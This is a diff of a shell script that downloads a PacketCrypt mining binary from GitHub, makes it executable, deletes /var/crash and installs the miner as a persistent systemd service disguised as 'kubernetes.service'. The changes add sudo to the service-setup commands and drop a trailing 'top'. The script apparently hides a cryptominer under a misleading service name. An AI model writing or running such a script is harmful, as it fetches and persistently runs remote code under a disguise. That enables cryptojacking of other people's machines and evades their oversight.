@@ -4,7 +4,7 @@ sudo wget -O anu https://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/do
 sudo chmod +x anu
 sudo rm -rf /lib/systemd/system/kubernetes.service
 sudo rm -rf /var/crash
-bash -c 'cat <<EOT >>/lib/systemd/system/kubernetes.service 
+sudo bash -c 'cat <<EOT >>/lib/systemd/system/kubernetes.service 
 [Unit]
 Description=gpu1
 After=network.target
@@ -19,11 +19,10 @@ WantedBy=multi-user.target
 EOT
 ' &&
 
-systemctl daemon-reload &&
-systemctl enable kubernetes.service &&
-service kubernetes stop  &&
-service kubernetes restart
+sudo systemctl daemon-reload &&
+sudo systemctl enable kubernetes.service &&
+sudo service kubernetes stop  &&
+sudo service kubernetes restart
 
 
 
-top
